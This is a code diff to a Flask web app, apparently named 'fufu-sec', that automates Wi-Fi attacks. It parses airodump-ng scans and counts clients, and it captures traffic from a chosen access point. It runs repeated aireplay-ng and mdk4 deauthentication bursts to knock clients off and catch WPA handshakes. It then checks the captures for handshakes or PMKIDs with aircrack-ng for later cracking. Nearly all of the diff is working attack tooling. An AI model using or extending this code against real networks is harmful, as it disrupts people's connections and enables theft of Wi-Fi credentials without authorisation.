@@ -9,6 +9,7 @@ Then open: http://localhost:5000
 """
 
 import os, subprocess, threading, time, json, re, shutil
+import html, select, random, urllib.request, urllib.error, argparse
 import logging, logging.handlers
 from datetime import datetime, timezone
 from flask import Flask, request, jsonify, g
@@ -111,7 +112,7 @@ def after_request(response):
 
 # ─── GLOBAL STATE ─────────────────────────────────────────────────────────────
 
-_proc_lock = threading.Lock()   # guards active_processes (BUG-017 fix)
+_proc_lock = threading.Lock()   # guards active_processes dict
 
 state = {
     "interface":            None,
@@ -143,9 +144,11 @@ def _tshark_eapol_count(capfile, bssid="", timeout_sec=4):
     """
     if not tool_exists("tshark"):
         return 0
-    bssid_filter = f" && (wlan.addr=={bssid})" if bssid else ""
-    cmd = (f"timeout {timeout_sec} tshark -r \"{capfile}\" "
-           f"-Y \"eapol{bssid_filter}\" -T fields -e frame.number "
+    # No BSSID filter: airodump uses -d {bssid} so file only has target frames.
+    # Adding wlan.addr filter can miss EAPOL frames (stored in wlan.ra/wlan.ta).
+    _ = bssid  # kept for API compatibility
+    cmd = (f"timeout {timeout_sec} tshark -r '{capfile}' "
+           f"-Y 'eapol' -T fields -e frame.number "
            f"2>/dev/null | wc -l")
     try:
         out, _, _ = run_cmd(cmd, timeout=timeout_sec + 2)
@@ -154,6 +157,20 @@ def _tshark_eapol_count(capfile, bssid="", timeout_sec=4):
         return 0
 
 def _ac_verify(capfile, bssid="", timeout_sec=20):
+    """
+    Verify a cap file for a WPA handshake using aircrack-ng.
+
+    Restored to the original working approach (no -b flag):
+    - Run: echo '1' | aircrack-ng "{capfile}"  (no -b)
+    - Check the full output for "WPA (N handshake"
+    - If bssid provided: walk each output line to confirm that BSSID appears
+      on the handshake line — more robust than -b which silently returns
+      0 networks if the BSSID format doesn't match exactly.
+
+    The -b flag was removed because with a locally-administered/random MAC
+    (e.g. mobile hotspot) aircrack-ng -b can fail to match even when the
+    handshake is present, returning False incorrectly.
+    """
     if not capfile or not os.path.exists(capfile):
         return False, "(file not found)", ""
     sz = os.path.getsize(capfile)
@@ -172,8 +189,18 @@ def _ac_verify(capfile, bssid="", timeout_sec=20):
     except Exception as e:
         return False, f"(error: {e})", ""
     out = _strip_ansi(raw)
+    # ── Check for PMKID-only first (no 4-way handshake) ─────────────────
+    # "N potential targets  P" in aircrack-ng output means PMKID captured
+    # but no complete 4-way handshake. Return distinct "pmkid" state.
+    if re.search(r"\d+ potential targets\s+P\b", out) and        not re.search(r"WPA \([1-9][0-9]? handshake", out):
+        return "pmkid", out, out
+    # ── Full 4-way handshake ─────────────────────────────────────────────
     if not re.search(r"WPA \([1-9][0-9]? handshake", out):
         return False, out, out
+    # Also accept "handshake, with PMKID" (newer aircrack-ng combined output)
+    if re.search(r"handshake, with PMKID", out):
+        return True, out, out
+    # BSSID check: walk lines to confirm handshake line contains our BSSID
     if bssid:
         bssid_up = bssid.upper()
         for line in out.splitlines():
@@ -185,6 +212,7 @@ def _ac_verify(capfile, bssid="", timeout_sec=20):
 
 def _ac_wpa2_check(capfile, bssid=""):
     if not capfile or not os.path.exists(capfile): return False
+    if not _safe_path(capfile, "/tmp/fufu-sec"): return False
     b_flag = f"-b {bssid}" if bssid else ""
     _, _, rc = run_cmd(f"aircrack-ng -a 2 {b_flag} -w \"{capfile}\" \"{capfile}\" > /dev/null 2>&1", timeout=20)
     return rc == 0
@@ -274,7 +302,7 @@ def _safe_path(path, base=TMPDIR):
 def status():
     return jsonify({"online": True, "interface": get_active_iface(),
                     "mode": state["mode"], "monitor_interface": state["monitor_interface"],
-                    "version": "3.0.0"})
+                    "version": FUFU_VERSION})
 
 
 @app.route("/api/health")
@@ -408,30 +436,68 @@ def monitor_disable():
 # ── SCAN ──────────────────────────────────────────────────────────────────────
 
 def parse_airodump(csv_file):
+    """Parse an airodump-ng CSV file.
+    Section 1 (AP lines): BSSID, first_time, last_time, channel, speed,
+      privacy, cipher, auth, power, beacons, ivs, id-length, essid, key
+    Section 2 (client lines): Station_MAC, first_time, last_time, power,
+      packets, BSSID, Probed_ESSIDs
+    """
     networks = []
     if not os.path.exists(csv_file): return networks
     try:
         with open(csv_file, encoding="latin-1") as f: lines = f.readlines()
     except Exception: return networks
-    in_ap = False
+
+    in_ap = False; in_sta = False
+    bssid_to_idx = {}   # BSSID → index in networks list for O(1) client increment
+
     for line in lines:
         line = line.rstrip("\n")
-        if line.strip().startswith("BSSID"):  in_ap = True;  continue
-        if line.strip() == "":               in_ap = False; continue
-        if not in_ap: continue
-        parts = [p.strip() for p in line.split(",")]
-        if len(parts) < 14: continue
-        bssid = parts[0].strip()
-        if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid): continue
-        try:
-            ssid_parts = parts[13:]
-            if ssid_parts and ssid_parts[-1] == "": ssid_parts = ssid_parts[:-1]
-            ssid = ",".join(ssid_parts).strip()
-            networks.append({"bssid": bssid, "ssid": ssid, "channel": parts[3].strip(),
-                             "power": parts[8].strip(), "enc": parts[5].strip(),
-                             "cipher": parts[6].strip(), "auth": parts[7].strip(),
-                             "beacons": parts[9].strip(), "clients": 0, "wps": False})
-        except Exception: continue
+        stripped = line.strip()
+
+        # Section headers
+        if stripped.startswith("BSSID"):
+            in_ap = True; in_sta = False; continue
+        if "Station MAC" in stripped:
+            in_ap = False; in_sta = True; continue
+        if stripped == "":
+            if in_ap: in_ap = False   # blank line ends AP section
+            continue
+
+        # ── Section 1: AP records ─────────────────────────────────────────
+        if in_ap:
+            parts = [p.strip() for p in line.split(",")]
+            if len(parts) < 14: continue
+            bssid = parts[0].strip()
+            if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", bssid): continue
+            try:
+                ssid_parts = parts[13:]
+                if ssid_parts and ssid_parts[-1] == "": ssid_parts = ssid_parts[:-1]
+                ssid = ",".join(ssid_parts).strip()
+                idx = len(networks)
+                networks.append({"bssid": bssid, "ssid": ssid,
+                                 "channel": parts[3].strip(),
+                                 "power":   parts[8].strip(),
+                                 "enc":     parts[5].strip(),
+                                 "cipher":  parts[6].strip(),
+                                 "auth":    parts[7].strip(),
+                                 "beacons": parts[9].strip(),
+                                 "clients": 0, "wps": False})
+                bssid_to_idx[bssid.upper()] = idx
+            except Exception: continue
+
+        # ── Section 2: client/station records ────────────────────────────
+        elif in_sta:
+            parts = [p.strip() for p in line.split(",")]
+            if len(parts) < 6: continue
+            sta_mac = parts[0].strip()
+            if not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", sta_mac): continue
+            assoc_bssid = parts[5].strip().upper()
+            if assoc_bssid and assoc_bssid != "(NOT ASSOCIATED)" and                re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", assoc_bssid):
+                idx = bssid_to_idx.get(assoc_bssid)
+                if idx is not None:
+                    networks[idx]["clients"] += 1
+
     return networks
 
 
@@ -446,6 +512,7 @@ def scan_start():
         if f.startswith("scan-"):
             try: os.remove(os.path.join(TMPDIR, f))
             except: pass
+    kill_bg("scan"); time.sleep(0.3)  # stop any existing scan first
     band_arg = "--band bg" if band == "bg" else "--band abg" if band == "5ghz" else ""
     proc = run_bg("scan", f"airodump-ng {band_arg} -w {TMPDIR}scan --output-format csv {iface}")
     state["scanning"] = True
@@ -465,9 +532,12 @@ def scan_start():
 @app.route("/api/scan/results")
 def scan_results():
     csv = TMPDIR+"scan-01.csv"; nets = state["scan_results"]
-    if state["scanning"] and os.path.exists(csv):
+    if os.path.exists(csv):
+        # Always re-parse when the file exists — client counts update in real time
         live = parse_airodump(csv)
-        if live: nets = live; state["scan_results"] = live
+        if live:
+            nets = live
+            state["scan_results"] = live
     return jsonify({"networks": nets, "scanning": state["scanning"], "count": len(nets)})
 
 
@@ -483,11 +553,15 @@ def capture_start():
     bssid   = (data.get("bssid") or "").strip(); channel = (data.get("channel") or "").strip()
     output  = data.get("output", TMPDIR+"capture").strip(); iface = get_active_iface()
     if not iface: return jsonify({"error": "No monitor interface"})
-    if not output or not _safe_path(output, "/tmp/fufu-sec"): output = TMPDIR+"capture"
+    # Use timestamp-based prefix so each monitor capture creates a new file
+    # instead of overwriting the same capture-01.cap every time.
+    _mon_ts = int(time.time() * 1000)
+    output = TMPDIR + f"mon_{_mon_ts}"
     b_flag = f"-d {bssid}" if bssid else ""; c_flag = f"-c {channel}" if channel else ""
     fmt = data.get("format","pcap,csv") or "pcap,csv"
     run_bg("capture", f"airodump-ng {b_flag} {c_flag} -w {output} --output-format {fmt} {iface}")
-    state["last_csv_file"] = output+"-01.csv"
+    state["last_csv_file"]    = output+"-01.csv"
+    state["last_cap_file"]    = output+"-01.cap"  # timestamped — never overwritten
     if bssid: audit("CAPTURE_START", f"bssid={bssid} ch={channel}")
     return jsonify({"success": f"Capture started on {iface}", "output": f"[*] Capturing → {output}-01.cap"})
 
@@ -504,23 +578,67 @@ def capture_status():
                 in_sta = False
                 for line in f:
                     line = line.strip()
-                    if "Station MAC" in line: in_sta = True; continue
-                    if not in_sta or not line: continue
+                    # "Station MAC" header starts client section — never leave it.
+                    # Blank lines between entries must NOT reset in_sta
+                    # (old bug: `if not in_sta or not line` exited on first blank).
+                    if "Station MAC" in line:
+                        in_sta = True
+                        continue
+                    if not in_sta:
+                        continue
+                    if not line:
+                        continue   # blank separator — stay in station section
                     parts = [p.strip() for p in line.split(",")]
-                    if len(parts) > 5:
-                        mac = parts[0]
-                        if re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", mac) and mac not in seen_macs:
-                            seen_macs.add(mac)
-                            assoc = parts[5].strip() if len(parts) > 5 else ""
-                            clients.append(f"{mac}" + (f" → {assoc}" if assoc else ""))
-        except: pass
-    has_hs = False
-    if cap_size >= 1024:
+                    if len(parts) < 6:
+                        continue
+                    mac = parts[0]
+                    if re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", mac) and mac not in seen_macs:
+                        seen_macs.add(mac)
+                        assoc = parts[5].strip() if len(parts) > 5 else ""
+                        safe_mac   = html.escape(mac)
+                        safe_assoc = html.escape(assoc)
+                        clients.append(safe_mac + (f" → {safe_assoc}" if safe_assoc else ""))
+        except Exception:
+            pass
+    # Throttle _ac_verify — it runs aircrack-ng with a 20s timeout and must
+    # not block the 3s monitor poll interval.  Run at most once every 30s;
+    # reuse the cached result between calls.
+    has_hs = state.get("_capstatus_hs_cache", False)
+    _last_verify = state.get("_capstatus_last_verify", 0)
+    if cap_size >= 1024 and (time.time() - _last_verify) >= 30:
         ok, _, _ = _ac_verify(cap_file, state.get("last_bssid",""))
         has_hs = ok
+        state["_capstatus_hs_cache"]    = ok
+        state["_capstatus_last_verify"] = time.time()
+    elif cap_size < 1024:
+        has_hs = False
+        state["_capstatus_hs_cache"] = False
     hs_msg = "FOUND ✓" if has_hs else ("Capturing..." if state.get("handshake_running") else "Idle")
-    return jsonify({"running": state.get("handshake_running",False), "found": has_hs,
-                    "cap_file": cap_file, "cap_size": cap_size, "packets": 0,
+    # Estimate packet count: tshark if available, else rough size estimate
+    # (cap header = 24 bytes, each frame ~100 bytes avg for 802.11)
+    packets = 0
+    if cap_size > 24:
+        if tool_exists("tshark"):
+            pkt_out, _, prc = run_cmd(
+                f"tshark -r '{cap_file}' -T fields -e frame.number 2>/dev/null | wc -l",
+                timeout=3)
+            # wc -l gives total frame count directly; more reliable than tail -1
+            pkt_str = pkt_out.strip()
+            if prc == 0 and pkt_str.isdigit() and int(pkt_str) > 0:
+                packets = int(pkt_str)
+        if packets == 0:
+            # Fallback size estimate: pcap global header = 24B, avg 802.11 frame ~110B
+            packets = max(0, (cap_size - 24) // 110)
+
+    # Also check the handshake worker's confirmed flag — so the Monitor page
+    # shows "FOUND" even when using a different cap file from the monitor capture.
+    hs_worker_confirmed = state.get("handshake_found", False)
+    effective_found = has_hs or hs_worker_confirmed
+    if hs_worker_confirmed and not has_hs:
+        hs_msg = "FOUND ✓ (see Handshake tab)"
+    return jsonify({"running": state.get("handshake_running",False),
+                    "found": effective_found,
+                    "cap_file": cap_file, "cap_size": cap_size, "packets": packets,
                     "clients": clients, "client_count": len(clients),
                     "status": hs_msg, "error": None})
 
@@ -539,7 +657,7 @@ def handshake_capture():
     bssid   = (data.get("bssid") or "").strip().upper()
     channel = str((data.get("channel") or "")).strip()
     client  = (data.get("client") or "").strip().upper()
-    timeout = int(data.get("timeout", 30))
+    timeout = int(data.get("timeout", 60))  # 60s default — 3 x 12s deauth bursts
     iface   = get_active_iface()
 
     if not bssid or not channel:
@@ -550,46 +668,36 @@ def handshake_capture():
         return jsonify({"error": f"Invalid BSSID: {bssid}"})
 
     # ── Pre-capture validation ────────────────────────────────────────────────
-    # Kills false-start errors before airodump is launched.
-    pre_diag = []
     iw_check, _, iw_rc = run_cmd(f"iw dev {iface} info 2>&1", timeout=5)
     if iw_rc != 0 or not iw_check.strip():
-        pre_diag.append(f"Interface '{iface}' not found. Run 'iw dev' to list interfaces.")
-        pre_diag.append("If you recently enabled monitor mode, the interface may have been renamed.")
-        pre_diag.append(f"Try: airmon-ng start wlan0 (check output for new interface name)")
-        return jsonify({"error": f"Interface '{iface}' not found", "output": "\n".join(pre_diag)})
-
+        return jsonify({"error": f"Interface '{iface}' not found — run 'iw dev' to list interfaces"})
     if "type monitor" not in iw_check.lower():
         mode_line = next((l.strip() for l in iw_check.splitlines() if "type" in l.lower()), "unknown")
-        return jsonify({"error": f"'{iface}' is not in monitor mode ({mode_line}). Enable monitor mode first."})
+        return jsonify({"error": f"'{iface}' not in monitor mode ({mode_line}). Enable monitor mode first."})
 
-    # Check rfkill
     rfkill_out, _, _ = run_cmd("rfkill list 2>/dev/null", timeout=5)
     if "Soft blocked: yes" in rfkill_out:
         run_cmd("rfkill unblock wifi 2>/dev/null; rfkill unblock all 2>/dev/null", timeout=5)
-        log.info(f"rfkill unblocked before handshake capture on {iface}")
 
-    # Ensure interface is UP
     run_cmd(f"ip link set {iface} up 2>/dev/null", timeout=5)
-
-    # Kill any stale capture processes that may be holding the interface
     kill_bg("capture"); kill_bg("handshake_cap"); time.sleep(0.3)
 
-    # PMF detection: check if AP has PMF enabled (frame cap: RSN MFPR/MFPC bits)
-    # We use tshark to inspect the last scan CSV beacon flags if available
-    # Store as advisory — still attempt capture but warn user
+    # ── PMF detection ─────────────────────────────────────────────────────────
     pmf_detected = False
-    scan_nets = state.get("scan_results", [])
-    bssid_upper = bssid.upper()
-    target_net = next((n for n in scan_nets if n.get("bssid","").upper() == bssid_upper), None)
+    target_net = next((n for n in state.get("scan_results", [])
+                       if n.get("bssid","").upper() == bssid), None)
     if target_net:
         auth = target_net.get("auth","").upper()
         enc  = target_net.get("enc","").upper()
-        # WPA3/SAE always uses PMF; WPA2-MGT often does too
         if "SAE" in auth or "WPA3" in enc or "MGT" in auth:
             pmf_detected = True
-            log.info(f"PMF likely on {bssid} (auth={auth} enc={enc})")
-    # ─────────────────────────────────────────────────────────────────────────
+    # Locally administered BSSID = mobile hotspot = likely PMF
+    if not pmf_detected:
+        try:
+            if (int(bssid.split(":")[0], 16) >> 1) & 1:
+                pmf_detected = True
+        except Exception:
+            pass
 
     _BROADCAST = "FF:FF:FF:FF:FF:FF"
     if not client or not re.match(r"([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", client) or client == _BROADCAST:
@@ -597,48 +705,40 @@ def handshake_capture():
 
     audit("HANDSHAKE_START", f"bssid={bssid} ch={channel}")
 
-    # BUG-023 fix: extended range + timestamp fallback
-    def _next_prefix():
-        for i in range(1, 10000):
-            if not os.path.exists(TMPDIR+f"hs{i}-01.cap"):
-                return TMPDIR+f"hs{i}", TMPDIR+f"hs{i}-01.cap", TMPDIR+f"hs{i}-01.csv"
-        ts = int(time.time())
-        return TMPDIR+f"hs_t{ts}", TMPDIR+f"hs_t{ts}-01.cap", TMPDIR+f"hs_t{ts}-01.csv"
-
-    cap_prefix, cap_file, csv_file = _next_prefix()
-    cap_num = cap_prefix.split("hs")[-1]
-    display_name = f"handshake-{cap_num}.cap"
+    # Timestamp-based prefix — guaranteed unique, no collision with prior runs
+    _ts = int(time.time() * 1000)
+    cap_prefix = TMPDIR + f"hs_{_ts}"
+    cap_file   = cap_prefix + "-01.cap"
+    csv_file   = cap_prefix + "-01.csv"
+    display_name = cap_prefix.split("/")[-1] + "-01.cap"
 
     run_cmd(f"iw dev {iface} set channel {channel} 2>/dev/null || "
             f"iwconfig {iface} channel {channel} 2>/dev/null; true", timeout=5)
 
-    dump_cmd  = f"airodump-ng -c {channel} -d {bssid} --write-interval 1 -w {cap_prefix} {iface}"
+    dump_cmd = (f"airodump-ng -c {channel} -d {bssid} "
+                f"--output-format pcap,csv --write-interval 1 -w {cap_prefix} {iface}")
     dump_proc = run_bg("handshake_cap", dump_cmd)
-    time.sleep(1.5)
+    time.sleep(3.0)   # give airodump time to lock channel before deauth fires
+
     if dump_proc.poll() is not None:
-        # Read whatever stderr airodump printed before dying
         try:
             early_err = dump_proc.stdout.read(400).strip() if dump_proc.stdout else ""
         except Exception:
             early_err = ""
-        diag = [
+        return jsonify({"error": "\n".join([
             f"airodump-ng exited immediately on '{iface}'.",
-            "",
-            "Diagnosis checklist:",
-            f"  1. Verify interface is still in monitor mode: iw dev {iface} info",
-            f"  2. Test injection support: aireplay-ng --test {iface}",
-            "  3. Check for rfkill block: rfkill list",
-            "  4. Check driver errors: dmesg | tail -20",
-            "  5. Try re-enabling monitor mode: airmon-ng stop {iface} && airmon-ng start wlan0",
-        ]
-        if early_err:
-            diag.append(f"\nairodump-ng output: {early_err[:300]}")
-        return jsonify({"error": "\n".join(diag)})
+            "  1. Verify monitor mode: iw dev " + iface + " info",
+            "  2. Test injection:      aireplay-ng --test " + iface,
+            "  3. Check rfkill:        rfkill list",
+            "  4. Re-enable monitor:   airmon-ng stop " + iface + " && airmon-ng start wlan0",
+        ]) + (f"\nairodump output: {early_err[:300]}" if early_err else "")})
 
     state.update({"last_cap_file": cap_file, "last_cap_prefix": cap_prefix,
                   "last_csv_file": csv_file, "last_bssid": bssid,
                   "handshake_running": True, "handshake_found": False,
-                  "handshake_result": "running", "hs_log": []})
+                  "handshake_result": "running", "hs_log": [],
+                  "_pmkid_logged": False,
+                  "pmkid_in_handshake_cap": ""})
 
     def _log(msg):
         state["hs_log"].append(msg)
@@ -648,205 +748,303 @@ def handshake_capture():
         f"[*] Interface  : {iface}",
         f"[*] Target     : {bssid}  CH{channel}",
         f"[*] Client     : {client or 'broadcast (FF:FF:FF:FF:FF:FF)'}",
-        f"[*] PMF detect : {'⚠ LIKELY (WPA3/SAE/MGT — deauth may be ignored)' if pmf_detected else 'Not detected (WPA2 standard deauth should work)'}",
-        f"[*] Output file: {cap_file}  (shown as {display_name})",
+        f"[*] PMF detect : {'⚠ LIKELY (mobile hotspot / WPA3 / SAE — deauth may be ignored)' if pmf_detected else 'Not detected — standard WPA2 deauth should work'}",
+        f"[*] Output file: {cap_file}",
         f"[*] airodump   : {dump_cmd}",
         f"[*] airodump-ng started (PID {dump_proc.pid})",
-        f"[*] Timeout    : {timeout}s  |  Deauth starts in 2s...",
+        f"[*] Timeout    : {timeout}s  |  Deauth starts in 3s...",
+        f"[*] Note       : Capturing target {bssid} only — BSSID filter at airodump level",
+        f"[*] Method     : Simultaneous — airodump captures WHILE aireplay deauths",
+        f"[*]              airodump starts first (3s), then deauth fires to force client reconnect",
+        f"[*]              Deauth runs 12s burst → 3s pause → repeat until timeout",
+        f"[*] Requires   : At least 1 active client on the AP at capture time",
     ]
+    if pmf_detected:
+        log_lines.append("[!] PMF detected — if no handshake, use Handshake → PMKID tab instead")
 
+    for msg in log_lines:
+        state["hs_log"].append(msg)
+
+    # ── Verify helpers ────────────────────────────────────────────────────────
     def _full_verify(filepath):
-        ok, raw, _ = _ac_verify(filepath, bssid)
-        if not ok:
+        result, raw, _ = _ac_verify(filepath, bssid)
+        if result == "pmkid":
+            _log("[-] No 4-way handshake — PMKID only (PMF active)")
+            _log("    → Use Handshake → PMKID tab for PMKID cracking")
+            return False
+        if result is not True:
             _log(f"[-] Verify failed: {raw[:120] if raw else 'no output'}")
             return False
         if not _ac_wpa2_check(filepath, bssid):
             _log("[!] WPA2 secondary check failed — may be WPA1/TKIP (still crackable)")
         return True
 
+    # ── Worker thread ─────────────────────────────────────────────────────────
     def hs_worker():
-        current_cap = cap_file; current_prefix = cap_prefix
+        nonlocal_hack = [cap_file, cap_prefix]   # [0]=current_cap, [1]=current_prefix
+
+        def current_cap():    return nonlocal_hack[0]
+        def current_prefix(): return nonlocal_hack[1]
+
         deauth_stop = threading.Event()
 
+        # ── Deauth loop ───────────────────────────────────────────────────────
         def _deauth_loop():
-            time.sleep(2)
-            bl_file = TMPDIR+"bl.txt"
+            time.sleep(3)    # airodump startup grace
+            bl_file = TMPDIR + "bl.txt"
             try:
-                with open(bl_file, "w") as f: f.write(bssid+"\n")
-            except: pass
+                with open(bl_file, "w") as f: f.write(bssid + "\n")
+            except Exception:
+                pass
             run_cmd(f"iw dev {iface} set channel {channel} 2>/dev/null || "
                     f"iwconfig {iface} channel {channel} 2>/dev/null; true", timeout=5)
-            burst = 0; working_cmd = None
+
+            _BROADCAST2 = "FF:FF:FF:FF:FF:FF"
+            c_flag = f"-c {client} " if (client and client.upper() != _BROADCAST2) else ""
+            burst  = 0
+            working_cmd = None
 
             def _try_aireplay(cmd, label):
                 try:
                     p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
-                                         stderr=subprocess.STDOUT, text=True, preexec_fn=os.setsid)
-                    # Fast check (0.3s) — if it dies immediately the adapter can't inject
+                                         stderr=subprocess.STDOUT, text=True,
+                                         preexec_fn=os.setsid)
                     deauth_stop.wait(0.3)
                     if p.poll() is not None:
-                        try: err = p.stdout.read(300).strip()
+                        try:    err = p.stdout.read(300).strip()
                         except: err = ""
-                        _log(f"[!] aireplay-ng ({label}) exited immediately: {err[:120] if err else 'no output'}")
+                        _log(f"[!] aireplay-ng ({label}) exited immediately: {err[:120]}")
                         return None
-                    return p   # still alive → injection is working
+                    return p
                 except Exception as e:
-                    _log(f"[!] aireplay-ng launch ({label}): {e}"); return None
+                    _log(f"[!] aireplay-ng launch ({label}): {e}")
+                    return None
+
+            # Airgeddon-faithful: 12s burst → kill → 3s pause → repeat
+            BURST_SECS = 12
+            PAUSE_SECS = 3
 
             while not deauth_stop.is_set():
                 burst += 1
-                # Re-lock channel before every burst (airodump channel scanning can drift)
+                # Re-lock channel before each burst
                 run_cmd(f"iw dev {iface} set channel {channel} 2>/dev/null || "
                         f"iwconfig {iface} channel {channel} 2>/dev/null; true", timeout=3)
-                c_flag = f"-c {client} " if (client and client.upper() != _BROADCAST) else ""
+
+                deauth_proc = None
                 if tool_exists("aireplay-ng"):
-                    proc = None
                     if working_cmd is None:
-                        cmd1 = f"aireplay-ng --deauth 0 -a {bssid} {c_flag}--ignore-negative-one {iface}"
-                        proc = _try_aireplay(cmd1, "tier1")
-                        if proc: working_cmd = cmd1; _log("[*] Deauth running (tier 1)")
-                        else:
-                            cmd2 = f"aireplay-ng --deauth 0 -a {bssid} {c_flag}{iface}"
-                            proc = _try_aireplay(cmd2, "tier2")
-                            if proc: working_cmd = cmd2; _log("[*] Deauth running (tier 2)")
-                            else:
-                                cmd3 = f"aireplay-ng -0 0 -a {bssid} {c_flag}{iface}"
-                                proc = _try_aireplay(cmd3, "tier3")
-                                if proc: working_cmd = cmd3; _log("[*] Deauth running (tier 3)")
-                                else:
-                                    working_cmd = "FAILED"
-                                    _log("[!] All aireplay-ng variants failed")
-                                    _log(f"    Verify injection: aireplay-ng --test {iface}")
-                    else:
-                        if working_cmd != "FAILED":
-                            try:
-                                proc = subprocess.Popen(working_cmd, shell=True,
-                                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
-                                    preexec_fn=os.setsid)
-                                deauth_stop.wait(1.5)
-                                if proc.poll() is not None:
-                                    _log(f"[!] Deauth exited on burst {burst} — re-probing")
-                                    working_cmd = None; proc = None
-                            except: proc = None
-                    if proc and proc.poll() is None:
-                        deauth_stop.wait(7)   # 7s burst (was 12s) — faster handshake triggering
-                        try: os.killpg(os.getpgid(proc.pid), 9)
-                        except: pass
-                        continue
-                    if tool_exists("mdk4"):
-                        da_cmd = f"mdk4 {iface} d -b {bl_file} -c {channel}"
-                        try:
-                            proc = subprocess.Popen(da_cmd, shell=True, stdout=subprocess.DEVNULL,
-                                stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
-                            if burst == 1: _log(f"[*] mdk4 deauth fallback")
-                        except Exception as e:
-                            _log(f"[!] mdk4 failed: {e}"); return
-                        deauth_stop.wait(7)   # 7s burst
-                        try: os.killpg(os.getpgid(proc.pid), 9)
-                        except: pass
-                    else:
-                        if burst == 1: _log("[!] aireplay-ng failed and mdk4 not installed")
-                        deauth_stop.wait(10)
-                elif tool_exists("mdk4"):
-                    da_cmd = f"mdk4 {iface} d -b {bl_file} -c {channel}"
+                        for tier, cmd in enumerate([
+                            f"aireplay-ng --deauth 0 -a {bssid} {c_flag}--ignore-negative-one {iface}",
+                            f"aireplay-ng --deauth 0 -a {bssid} {c_flag}{iface}",
+                            f"aireplay-ng -0 0 -a {bssid} {c_flag}{iface}",
+                        ], 1):
+                            deauth_proc = _try_aireplay(cmd, f"tier{tier}")
+                            if deauth_proc:
+                                working_cmd = cmd
+                                _log(f"[*] Deauth running (tier {tier})")
+                                break
+                        if not deauth_proc:
+                            working_cmd = "FAILED"
+                            _log("[!] All aireplay-ng variants failed — passive capture mode")
+                            _log(f"    Manually reconnect a device to {bssid} (turn WiFi off/on)")
+                            _log(f"    Verify injection: aireplay-ng --test {iface}")
+                    elif working_cmd != "FAILED":
+                        deauth_proc = _try_aireplay(working_cmd, f"burst{burst}")
+                        if not deauth_proc:
+                            _log(f"[!] Deauth exited on burst {burst} — re-probing")
+                            working_cmd = None
+
+                if not deauth_proc and tool_exists("mdk4") and working_cmd in (None, "FAILED"):
                     try:
-                        proc = subprocess.Popen(da_cmd, shell=True, stdout=subprocess.DEVNULL,
+                        deauth_proc = subprocess.Popen(
+                            f"mdk4 {iface} d -b {bl_file} -c {channel}",
+                            shell=True, stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL, preexec_fn=os.setsid)
-                        if burst == 1: _log(f"[*] mdk4: {da_cmd}")
+                        if burst == 1:
+                            _log("[*] mdk4 deauth fallback")
                     except Exception as e:
-                        _log(f"[!] mdk4 error: {e}"); return
-                    deauth_stop.wait(7)
-                    try: os.killpg(os.getpgid(proc.pid), 9)
-                    except: pass
+                        _log(f"[!] mdk4 failed: {e}")
+
+                if deauth_proc and deauth_proc.poll() is None:
+                    # Run for BURST_SECS then kill (airgeddon sleeptimeattack=12)
+                    deauth_stop.wait(BURST_SECS)
+                    try: os.killpg(os.getpgid(deauth_proc.pid), 9)
+                    except Exception: pass
+                    if deauth_stop.is_set():
+                        break
+                    _log(f"[~] Deauth burst {burst} done — pausing {PAUSE_SECS}s")
+                    deauth_stop.wait(PAUSE_SECS)
                 else:
-                    _log("[!] Neither aireplay-ng nor mdk4 found"); return
+                    deauth_stop.wait(10)   # passive — wait before next check
 
         threading.Thread(target=_deauth_loop, daemon=True).start()
 
-        def _next_prefix_local():
-            for i in range(1, 10000):
-                if not os.path.exists(TMPDIR+f"hs{i}-01.cap"):
-                    return TMPDIR+f"hs{i}", TMPDIR+f"hs{i}-01.cap", TMPDIR+f"hs{i}-01.csv"
-            ts = int(time.time())
-            return TMPDIR+f"hs_t{ts}", TMPDIR+f"hs_t{ts}-01.cap", TMPDIR+f"hs_t{ts}-01.csv"
-
+        # ── Restart helper ────────────────────────────────────────────────────
         def _restart_airodump(reason):
-            nonlocal current_cap, current_prefix
-            _log(f"[~] {reason} — restarting airodump on new prefix")
-            kill_bg("handshake_cap"); time.sleep(1.2)  # give kernel time to release interface
-            new_prefix, new_cap, new_csv = _next_prefix_local()
-            current_prefix = new_prefix; current_cap = new_cap
-            state["last_cap_file"] = new_cap; state["last_csv_file"] = new_csv
-            run_bg("handshake_cap", f"airodump-ng -c {channel} -d {bssid} --write-interval 1 -w {new_prefix} {iface}")
+            _log(f"[~] {reason} — restarting airodump")
+            kill_bg("handshake_cap")
+            time.sleep(1.5)
+            run_cmd(f"ip link set {iface} up 2>/dev/null", timeout=5)
+            _ts2 = int(time.time() * 1000)
+            new_prefix = TMPDIR + f"hs_r{_ts2}"
+            new_cap    = new_prefix + "-01.cap"
+            new_csv    = new_prefix + "-01.csv"
+            nonlocal_hack[0] = new_cap
+            nonlocal_hack[1] = new_prefix
+            state["last_cap_file"] = new_cap
+            state["last_csv_file"] = new_csv
+            run_bg("handshake_cap",
+                   f"airodump-ng -c {channel} -d {bssid} "
+                   f"--output-format pcap,csv --write-interval 1 -w {new_prefix} {iface}")
             _log(f"[*] New capture file: {new_cap}")
 
+        # ── Confirm & finish ──────────────────────────────────────────────────
         def _confirm_and_finish(filepath):
-            deauth_stop.set(); kill_bg("handshake_cap"); time.sleep(2.0)
+            deauth_stop.set()
+            kill_bg("handshake_cap")
+            time.sleep(2.0)
             _log(f"[*] Verifying closed file: {filepath}")
             if _full_verify(filepath):
-                state.update({"handshake_found": True, "handshake_result": "CAPTURED",
-                              "last_cap_file": filepath})
+                state.update({"handshake_found": True,
+                              "handshake_result": "CAPTURED",
+                              "last_cap_file":    filepath,
+                              "last_hs_cap_file": filepath})
                 _log(f"[+] ✓ HANDSHAKE CONFIRMED: {filepath}")
                 audit("HANDSHAKE_CAPTURED", f"bssid={bssid} file={filepath}")
+                _hs_list_cache.pop(filepath, None)
                 return True
             _log("[-] Closed-file re-verify failed (false positive) — resuming")
             return False
 
